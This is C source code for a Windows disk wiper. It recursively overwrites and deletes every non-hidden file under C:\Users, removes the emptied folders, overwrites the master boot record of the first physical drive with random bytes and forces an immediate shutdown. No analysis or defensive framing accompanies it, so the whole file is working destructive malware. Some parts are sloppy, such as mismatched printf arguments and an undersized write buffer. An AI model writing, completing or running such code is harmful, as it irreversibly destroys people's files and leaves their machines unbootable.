#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <windows.h>

#define shutdown "shutdown /s /t 0"

int WipeMBR()
{
	printf("----- [+] Disk Wiper [+] -----\n");
	char Characters[] = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
	size_t DataLength[2048] = {0};
	time_t GetTime = time(NULL);
	srand((unsigned int)GetTime);
	printf("[+] Time is : %ld\n", GetTime);

	for (int i = 0; i < 2048; i++)
	{
		int GetRandIndex = rand() % (sizeof(Characters) - 1);
		DataLength[i] = Characters[GetRandIndex];
	}

	printf("[+] Wiping with the following characters:\n");

	for (int j = 0; j < 2048; j++)
	{
		printf("%c", DataLength[j]);
	}

	HANDLE Disk = CreateFile("\\\\.\\PhysicalDrive0", GENERIC_ALL, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_SYSTEM, NULL);

	if (Disk == INVALID_HANDLE_VALUE)
	{
		printf("\nErr_CreateFile. Code_GLE: %ld\n", GetLastError());
		return 1;
	}

	printf("\n[+] Handle Opened\n");

	char Buffer[2048];
	printf("[+] Copying Array to Buffer\n");
	memcpy(Buffer, DataLength, sizeof(DataLength));
	BOOL Success = WriteFile(Disk, Buffer, 2048, NULL, NULL);

	if (Success == 0)
	{
		CloseHandle(Disk);
		printf("Err_Wipe. Handle closed. Code_GLE: %ld\n", GetLastError());
		return 1;
	}

	CloseHandle(Disk);
	printf("[+++] Wipe Successful. Handle closed\n");
	return 0;
}

void ListFilesRecursively(const char *Path)
{
	WIN32_FIND_DATAA FindFileData;
	HANDLE FindFile = INVALID_HANDLE_VALUE;
	char SearchPath[MAX_PATH];

	snprintf(SearchPath, MAX_PATH, "%s\\*", Path);

	FindFile = FindFirstFileA(SearchPath, &FindFileData);
	if (FindFile == INVALID_HANDLE_VALUE)
	{
		printf("Err_SearchDir. Code_GLE: %ld\n", Path, GetLastError());
		return;
	}

	do
	{
		if (strcmp(FindFileData.cFileName, ".") != 0 && strcmp(FindFileData.cFileName, "..") != 0 && (FindFileData.dwFileAttributes & FILE_ATTRIBUTE_HIDDEN) == 0 && (FindFileData.dwFileAttributes & FILE_ATTRIBUTE_SYSTEM) == 0)
		{
			printf("%s\\%s\n", Path, FindFileData.cFileName);
			if (FindFileData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
			{
				char subPath[MAX_PATH];
				snprintf(subPath, MAX_PATH, "%s\\%s", Path, FindFileData.cFileName);
				ListFilesRecursively(subPath);
			}
			else
			{
				char NewPathToFile[MAX_PATH];
				snprintf(NewPathToFile, MAX_PATH, "%s\\%s", Path, FindFileData.cFileName);
				DestroyFile(NewPathToFile);
			}
		}
	} while (FindNextFileA(FindFile, &FindFileData) != 0);

	FindClose(FindFile);
	printf("[+++] Success::LFR!\n");
}

int DestroyFile(const char *NewPathToFile)
{
	HANDLE File = CreateFileA(NewPathToFile, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, 3, 128, NULL);

	if (File == INVALID_HANDLE_VALUE)
	{
		printf("Err_OpenFile. Code_GLE: %ld\n", NewPathToFile, GetLastError());
		printf("Exiting Destruction Of File!\n");
		return EXIT_FAILURE;
	}

	DWORD SizeToOverwrite = GetFileSize(File, NULL);

	if (SizeToOverwrite == INVALID_FILE_SIZE)
	{
		CloseHandle(File);
		printf("Err_GetFileSize. Code_GLE: %ld\n", NewPathToFile, GetLastError());
		printf("Exiting Destruction Of File!\n");
		return EXIT_FAILURE;
	}

	if (SizeToOverwrite > 4096)
	{
		SizeToOverwrite = (4096 / 2);
	}

	printf("[+] FileSize To Overwrite: %lu\n", SizeToOverwrite);

	DWORD BytesWritten = 0;
	char Buffer[sizeof(SizeToOverwrite)] = {0};
	BOOL Overwrite = WriteFile(File, &Buffer, SizeToOverwrite, &BytesWritten, NULL);

	if (Overwrite == 0)
	{
		CloseHandle(File);
		printf("Err_WriteFile. Code_GLE: %ld\n", NewPathToFile, GetLastError());
		printf("Exiting Destruction Of File!\n");
		return EXIT_FAILURE;
	}

	printf("[+] File Overwritten\n");
	CloseHandle(File);
	printf("[+] Handle Closed\n");

	if (DeleteFileA(NewPathToFile) == 0)
	{
		CloseHandle(File);
		printf("Err_DeleteFileA. Code_GLE: %ld\n", NewPathToFile, GetLastError());
		printf("Exiting Destruction Of File!\n");
		return EXIT_FAILURE;
	}

	printf("[+] Deleted\n");
	printf("[+++] Success::DF!\n");
	return 0;
}

int RemoveEmptyDirsRecursively(const char *Path)
{
	WIN32_FIND_DATAA FindFileData;
	HANDLE FindFile = INVALID_HANDLE_VALUE;
	char SearchPath[MAX_PATH];
	char SubPath[MAX_PATH];
	BOOL IsEmpty = TRUE;

	snprintf(SearchPath, MAX_PATH, "%s\\*", Path);

	FindFile = FindFirstFileA(SearchPath, &FindFileData);

	if (FindFile == INVALID_HANDLE_VALUE)
	{
		printf("Err_SearchDir: %s | Code_GLE: %ld\n", Path, GetLastError());
		return 1;
	}

	do
	{
		if (strcmp(FindFileData.cFileName, ".") != 0 && strcmp(FindFileData.cFileName, "..") != 0 && (FindFileData.dwFileAttributes & FILE_ATTRIBUTE_HIDDEN) == 0 && (FindFileData.dwFileAttributes & FILE_ATTRIBUTE_SYSTEM) == 0)
		{
			snprintf(SubPath, MAX_PATH, "%s\\%s", Path, FindFileData.cFileName);

			if (FindFileData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
			{
				if (RemoveEmptyDirsRecursively(SubPath) != 0)
				{
					IsEmpty = FALSE;
				}
			}
			else
			{
				IsEmpty = FALSE;
			}
		}
	} while (FindNextFileA(FindFile, &FindFileData) != 0);

	FindClose(FindFile);

	if (IsEmpty)
	{
		if (RemoveDirectory(Path))
		{
			printf("[+] Deleted Dir: %s\n", SearchPath);
			printf("[+++] Success::REDR!\n");
			return 0;
		}
		else
		{
			printf("[-] Err_RemDir: %s | Code_GLE: %lu\n", SearchPath, GetLastError());
			return 1;
		}
	}

	return 1;
}

int main()
{
	ListFilesRecursively("C:\\Users");
	RemoveEmptyDirsRecursively("C:\\Users");
	WipeMBR();
	system(shutdown);
	return 0;
}
